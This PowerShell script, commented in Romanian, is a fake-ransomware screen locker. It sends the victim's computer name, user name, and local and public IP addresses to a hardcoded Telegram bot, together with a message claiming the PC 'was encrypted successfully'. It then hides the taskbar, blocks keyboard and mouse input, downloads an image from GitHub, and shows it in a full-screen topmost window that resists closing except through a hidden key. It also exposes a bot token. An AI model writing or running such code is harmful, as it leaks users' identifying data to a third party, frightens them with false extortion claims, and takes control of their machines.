Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Cod nativ pt blocare și taskbar
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# ▶️ INFO TELEGRAM
$pc = $env:COMPUTERNAME
$user = $env:USERNAME

# IP local
$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress

# IP public
try {
    $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
} catch {
    $ipPublic = "n/a"
}

# Mesaj Telegram
$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"

# Trimite în Telegram
$uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
$body = @{
    'chat_id' = '656189986'
    'text'    = $message
} | ConvertTo-Json -Compress

try {
    Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
} catch {}

# ▶️ Ascunde Taskbar și blochează input
$taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
[Native]::ShowWindow($taskbar, 0)
[Native]::BlockInput($true)

# ▶️ Descarcă imaginea
$temp = "$env:TEMP\poza_laptop.jpg"
Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing

# ▶️ Calculează rezoluția totală a monitoarelor
$bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
$minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
$minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
$maxRight = ($bounds | ForEach-Object { $_.Right }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
$maxBottom = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
$width = $maxRight - $minX
$height = $maxBottom - $minY

# ▶️ Variabilă de control
$script:inchis = $false

# ▶️ Creează fereastra mare
$form = New-Object Windows.Forms.Form
$form.StartPosition = 'Manual'
$form.Location = New-Object Drawing.Point $minX, $minY
$form.Size = New-Object Drawing.Size $width, $height
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.ShowInTaskbar = $false
$form.BackColor = 'Black'
$form.KeyPreview = $true
$form.Cursor = [System.Windows.Forms.Cursors]::None

$img = [System.Drawing.Image]::FromFile($temp)
$pb = New-Object Windows.Forms.PictureBox
$pb.Image = $img
$pb.Dock = 'Fill'
$pb.SizeMode = 'Zoom'
$form.Controls.Add($pb)

# ▶️ Închide la tasta C
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'C') {
        $script:inchis = $true
        $form.Close()
    }
})

$form.Add_FormClosing({
    if (-not $script:inchis) { $_.Cancel = $true }
})

# ▶️ Rulează aplicația
$form.Show()
[System.Windows.Forms.Application]::Run($form)

# ▶️ Deblochează după închidere
[Native]::BlockInput($false)
[Native]::ShowWindow($taskbar, 1)
